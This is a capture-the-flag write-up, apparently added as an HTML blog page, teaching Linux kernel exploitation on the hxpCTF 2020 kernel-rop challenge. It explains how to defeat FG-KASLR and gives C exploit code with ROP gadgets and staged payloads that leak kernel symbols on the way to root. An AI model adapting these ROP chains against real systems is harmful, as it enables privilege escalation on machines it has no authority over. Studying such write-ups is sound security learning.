@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Learning Linux Kernel Exploitation - Part 3 - Midas Blog</title><meta name="Description" content="The final part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Full protection"><meta property="og:title" content="Learning Linux Kernel Exploitation - Part 3" />
+<meta property="og:description" content="The final part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Full protection" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/" />
+<meta property="og:image" content="https://lkmidas.github.io/images/avatar.png"/>
+<meta property="article:published_time" content="2021-02-05T10:11:42+07:00" />
+<meta property="article:modified_time" content="2021-02-05T10:11:42+07:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://lkmidas.github.io/images/avatar.png"/>
+
+<meta name="twitter:title" content="Learning Linux Kernel Exploitation - Part 3"/>
+<meta name="twitter:description" content="The final part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Full protection"/>
+<meta name="application-name" content="Midas Blog">
+<meta name="apple-mobile-web-app-title" content="Midas Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/" /><link rel="prev" href="https://lkmidas.github.io/posts/20210201-justctf2020-writeups/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Learning Linux Kernel Exploitation - Part 3",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/lkmidas.github.io\/posts\/20210205-linux-kernel-pwn-part-3\/"
+        },"genre": "posts","wordcount":  2301 ,
+        "url": "https:\/\/lkmidas.github.io\/posts\/20210205-linux-kernel-pwn-part-3\/","datePublished": "2021-02-05T10:11:42+07:00","dateModified": "2021-02-05T10:11:42+07:00","publisher": {
+            "@type": "Organization",
+            "name": "Midas"},"author": {
+                "@type": "Person",
+                "name": "Midas"
+            },"description": "The final part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Full protection"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Midas Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Midas Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Learning Linux Kernel Exploitation - Part 3</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Midas</a></span>&nbsp;<span class="post-category">included in <a href="/categories/pwning/"><i class="far fa-folder fa-fw"></i>pwning</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-02-05">2021-02-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2301 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;11 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#about-kaslr-and-fg-kaslr">About KASLR and FG-KASLR</a></li>
+    <li><a href="#gathering-useful-gadgets">Gathering useful gadgets</a></li>
+    <li><a href="#leaking-commit_creds">Leaking commit_creds()</a></li>
+    <li><a href="#leaking-prepare_kernel_cred">Leaking prepare_kernel_cred()</a></li>
+    <li><a href="#calling-prepare_kernel_cred0">Calling prepare_kernel_cred(0)</a></li>
+    <li><a href="#calling-commit_creds-and-opening-root-shell">Calling commit_creds() and opening root shell</a></li>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#appendix">Appendix</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><ul>
+<li><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/" target="_blank" rel="noopener noreffer">Learning Linux Kernel Exploitation - Part 1</a></li>
+<li><a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/" target="_blank" rel="noopener noreffer">Learning Linux Kernel Exploitation - Part 2</a></li>
+</ul>
+<h2 id="preface">Preface</h2>
+<p>We have finally come to the last part of <strong>Learning Linux Kernel Exploitation</strong>. In the previous parts, I have walked you through my process of learning kernel pwn, from setting up the environment, to different exploit techniques that can be used against different mitigation features and scenarios. All of which was delivered using what were provided by <code>hxpCTF 2020</code> challenge <code>kernel-rop</code>. To the end of the last part, the only difference left between my setup and the original given challenge is <code>KASLR</code>. Therefore, in this post, I will be adding <code>KASLR</code> to the play, effectively revert back to the original given environment, then I will explain the exploit process based on <a href="https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/" target="_blank" rel="noopener noreffer">the actual writeup from the authors themselves</a>.</p>
+<p>Again, just like the last post, I won&rsquo;t re-explain what I have already done in the previous parts. You can always check them out.</p>
+<div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><em>Use the table of contents on the right to navigate to the section that you are interested in.</em></div>
+        </div>
+    </div>
+<p>Since this is essentially a challenge&rsquo;s writeup, I will provide the <code>TL;DR</code>:</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>TL;DR<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ol>
+<li>Run the system multiple times and read <code>/proc/kallsyms</code> -&gt; Notice the system uses <a href="https://lwn.net/Articles/824307/" target="_blank" rel="noopener noreffer">FG-KASLR</a>.</li>
+<li>Find the address ranges that aren&rsquo;t affected by <code>FG-KASLR</code> -&gt; Get a few gadgets, <code>kpti trampoline</code> and <code>ksymtab</code>.</li>
+<li>Leak stack cookie and image base from the stack.</li>
+<li>Stage 1: Leak <code>commit_creds()</code> using gadgets from (2) and <code>ksymtab</code>, then safely return to userland.</li>
+<li>Stage 2: Leak <code>prepare_kernel_cred()</code> using gadgets from (2) and <code>ksymtab</code> (the same as (4)), then safely return to userland.</li>
+<li>Stage 3: Call <code>prepare_kernel_cred(0)</code>, then safely return to userland and save the address of the returned <code>cred_struct</code>.</li>
+<li>Stage 4: Call <code>commit_creds()</code> on the saved <code>cred_struct</code> from (6) -&gt; open a root shell.</li>
+</ol>
+</div>
+        </div>
+    </div>
+<h2 id="about-kaslr-and-fg-kaslr">About KASLR and FG-KASLR</h2>
+<p><code>KASLR</code>, abbreviated for <a href="https://lwn.net/Articles/569635/" target="_blank" rel="noopener noreffer">Kernel address space layout randomization (KASLR)</a>, is just like <code>ASLR</code> on userland, it randomizes the base address where the kernel image is loaded each time the system is booted. It can be enabled/disabled by adding <code>kaslr</code> or <code>nokaslr</code> under <code>-append</code> option.</p>
+<p>To defeat userland <code>ASLR</code>, what we typically do is to leak an address in the section, calculate the base address of the section from it, then all the others addresses will be just offset from there since what gets randomize is the base address, while the offsets are always the same. This is also true for normal <code>KASLR</code>, where the image base is randomized, and all the others functions will be just a constant offset from it. If this is the case for us in this challenge, because we can read a lot of data from the stack, we can easily read an address of the kernel image <code>.text</code> section from there and we have already defeated <code>KASLR</code>. However, things are not that simple for us (as you might have thought, if it&rsquo;s that simple I probably won&rsquo;t make a separate post for it).</p>
+<p>Booting the system several times and reading <code>/proc/kallsyms</code>, you will notice that most of the symbols get <em>randomized on their own</em>, so there addresses are not a constant offset from the kernel <code>.text</code> base like what we used to deal with. This is called <a href="https://lwn.net/Articles/824307/" target="_blank" rel="noopener noreffer">Function Granular KASLR</a>. It&rsquo;s purpose is to prevent hackers from defeating <code>KASLR</code> in the traditional way, by &ldquo;rearrange your kernel code at load time on a per-function level granularity, with only around a second added to boot time&rdquo;.</p>
+<p>In theory, if everything in the kernel gets completely randomized, it will be almost impossible for us to gather useful gadgets from the kernel image. However, this novel mitigation feature still suffers from weaknesses, and we will take advantage of those to deliver a successful exploit.</p>
+<h2 id="gathering-useful-gadgets">Gathering useful gadgets</h2>
+<p>The fine-grainness of <code>FG-KASLR</code> is imperfect, there are certain regions in the kernel that never get randomized. Here are the unaffected regions that are useful to us:</p>
+<ol>
+<li>The functions from <code>_text</code> base to <code>__x86_retpoline_r15</code>, which is <code>_text+0x400dc6</code> are unaffected. Unfortunately, <code>commit_creds()</code> and <code>prepare_kernel_cred()</code> don&rsquo;t reside in this region, but we can still look for useful registers and memory manipulation gadgets from here.</li>
+<li>KPTI trampoline <code>swapgs_restore_regs_and_return_to_usermode()</code> is unaffected.</li>
+<li>The kernel symbol table <code>ksymtab</code>, starts at <code>_text+0xf85198</code> is unaffected. In here contains the offsets that can be used to calculate the addresses of <code>commit_creds()</code> and <code>prepare_kernel_cred()</code>.</li>
+</ol>
+<p>For (1), here are the 3 gadgets that I used:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x4d11UL</span><span class="p">;</span> <span class="c1">// pop rax; ret
+</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">read_mem_pop1_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x4aaeUL</span><span class="p">;</span> <span class="c1">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;
+</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi_rbp_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x38a0UL</span><span class="p">;</span> <span class="c1">// pop rdi; pop rbp; ret;
+</span></code></pre></div><p>The first 2 gadgets can be used to read an arbitrary memory block, by simply popping its address subtract by 0x10 to <code>rax</code>. The third gadget is a normal <code>pop rdi</code> for functions' parameter.</p>
+<p>For (3), here is the structure of an entry in <code>ksymtab</code> (<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/export.h#L60" target="_blank" rel="noopener noreffer">source</a>):</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">kernel_symbol</span> <span class="p">{</span>
+	  <span class="kt">int</span> <span class="n">value_offset</span><span class="p">;</span>
+	  <span class="kt">int</span> <span class="n">name_offset</span><span class="p">;</span>
+	  <span class="kt">int</span> <span class="n">namespace_offset</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div><p>The <code>value_offset</code> is what we are interested in, it is simply the offset from the symbol entry&rsquo;s address in <code>ksymtab</code> to the actual symbol&rsquo;s address itself (you can verify this by attaching <code>gdb</code> to debug and inspect <code>ksymtab</code>). To get the address of <code>ksymtab</code> entries, we can also read them from <code>/proc/kallsyms</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">cat /proc/kallsyms <span class="p">|</span> grep ksymtab_commit_creds
+-&gt; ffffffffb7f87d90 r __ksymtab_commit_creds
+cat /proc/kallsyms <span class="p">|</span> grep ksymtab_prepare_kernel_cred
+-&gt; ffffffffb7f8d4fc r __ksymtab_prepare_kernel_cred
+</code></pre></div><p>To leak the image base address, since we can leak a huge amount of data from the kernel stack, we can attach the debugger and inspect the stack to look for any kernel address that belongs to unaffected region (1). There actually one at offset 38:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">40</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+    <span class="n">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="n">image_base</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">38</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0xa157ULL</span><span class="p">;</span>
+    <span class="n">kpti_trampoline</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x200f10UL</span> <span class="o">+</span> <span class="mi">22UL</span><span class="p">;</span>
+    <span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x4d11UL</span><span class="p">;</span>
+    <span class="n">read_mem_pop1_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x4aaeUL</span><span class="p">;</span>
+    <span class="n">pop_rdi_rbp_ret</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0x38a0UL</span><span class="p">;</span>
+    <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0xf8d4fcUL</span><span class="p">;</span>
+    <span class="n">ksymtab_commit_creds</span> <span class="o">=</span> <span class="n">image_base</span> <span class="o">+</span> <span class="mh">0xf87d90UL</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; Image base: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">image_base</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><h2 id="leaking-commit_creds">Leaking commit_creds()</h2>
+<p>According to what I have gathered in the last step, my plan to leak <code>commit_creds()</code> is by reading the <code>value_offset</code> of <code>ksymtab_commit_creds</code>, then add them together. We will use our 2 memory read gadgets to read it, using the same ROP technique that I have introduced in <a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/" target="_blank" rel="noopener noreffer">the last part</a>, then safely return to userland via <code>KPTI trampoline</code> to prepare for the next stage:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">stage_1</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rax_ret</span><span class="p">;</span> <span class="c1">// return address
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ksymtab_commit_creds</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span> <span class="c1">// rax &lt;- __ksymtabs_commit_creds - 0x10
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_mem_pop1_ret</span><span class="p">;</span> <span class="c1">// rax &lt;- [__ksymtabs_commit_creds]
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_trampoline</span><span class="p">;</span> <span class="c1">// swapgs_restore_regs_and_return_to_usermode + 22
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rdi
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_commit_creds</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to leak commit_creds()&#34;</span><span class="p">);</span>
+    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>You can clearly see that what I did was to pop <code>ksymtabs_commit_creds - 0x10</code> into <code>rax</code>, then use the second gadget to read the <code>value_offset</code> field, after this ROP chain returns to userland into the function I called <code>get_commit_creds</code>, the <code>value_offset</code> of <code>__ksymtabs_commit_creds</code> will be stored in <code>rax</code>.</p>
+<div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Even though there is a <code>pop rax</code> in <code>KPTI trampoline</code> and we use a dummy value to pop into it, our resulting <code>rax</code> that we have read is still recovered correctly, so we don&rsquo;t need to care about it.</div>
+        </div>
+    </div>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">get_commit_creds</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">__asm__</span><span class="p">(</span>
+        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+        <span class="s">&#34;mov tmp_store, rax;&#34;</span>
+        <span class="s">&#34;.att_syntax;&#34;</span>
+    <span class="p">);</span>
+    <span class="n">commit_creds</span> <span class="o">=</span> <span class="n">ksymtab_commit_creds</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">tmp_store</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; commit_creds: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">);</span>
+    <span class="n">stage_2</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div><p>After returning from <code>kernel-mode</code>, we have to actually retrieve the value from <code>rax</code> to calculate the actual address of <code>commit_creds</code>. Notice that in the code, I used a variable called <code>tmp_store</code>, which is just an <code>unsigned long</code> global variable. This is a very convenient way to move the value from a register to memory using a small in-line assembly piece of code. Also remember to cast the value to <code>int</code>, because that is the data type in which <code>value_offset</code> is stored.</p>
+<p>After that, I immediatelt make a call to <code>stage_2()</code> to continue the exploitation chain.</p>
+<h2 id="leaking-prepare_kernel_cred">Leaking prepare_kernel_cred()</h2>
+<p>Nothing more to say in this stage, it is exactly the same as stage 1:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">stage_2</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rax_ret</span><span class="p">;</span> <span class="c1">// return address
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span> <span class="c1">// rax &lt;- __ksymtabs_prepare_kernel_cred - 0x10
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_mem_pop1_ret</span><span class="p">;</span> <span class="c1">// rax &lt;- [__ksymtabs_prepare_kernel_cred]
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kpti_trampoline</span><span class="p">;</span> <span class="c1">// swapgs_restore_regs_and_return_to_usermode + 22
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rax
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rdi
+</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_prepare_kernel_cred</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload to leak prepare_kernel_cred()&#34;</span><span class="p">);</span>
+    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_prepare_kernel_cred</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+    <span class="n">__asm__</span><span class="p">(</span>
+        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+        <span class="s">&#34;mov tmp_store, rax;&#34;</span>
+        <span class="s">&#34;.att_syntax;&#34;</span>
+    <span class="p">);</span>
+    <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="n">ksymtab_prepare_kernel_cred</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">tmp_store</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;    --&gt; prepare_kernel_cred: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span><span class="p">);</span>
+    <span class="n">stage_3</span><span class="p">();</span>
+<span class="p">}</span>
